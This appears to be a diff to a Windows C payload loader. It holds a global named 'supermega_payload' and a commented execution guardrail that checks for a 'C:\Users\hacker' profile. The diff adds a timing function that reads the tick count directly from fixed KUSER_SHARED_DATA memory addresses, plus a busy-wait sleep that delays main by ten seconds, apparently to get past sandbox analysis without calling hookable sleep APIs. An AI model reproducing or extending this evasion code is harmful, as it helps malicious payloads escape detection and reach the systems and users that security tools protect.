@@ -1,9 +1,28 @@
 #include <Windows.h>
 
+#include <time.h>
+
 char *supermega_payload;
+
+int get_time_raw() {
+    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
+    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
+    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
+    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
+        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
+    return kernelTime;
+}
+
+
+int sleep_ms(DWORD sleeptime) {
+    DWORD start = get_time_raw();
+    while (get_time_raw() - start < sleeptime) {}
+}
 
 int main()
 {
+	sleep_ms(10000);
+
 	// Execution Guardrail: Env Check
 	//wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
 	//wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
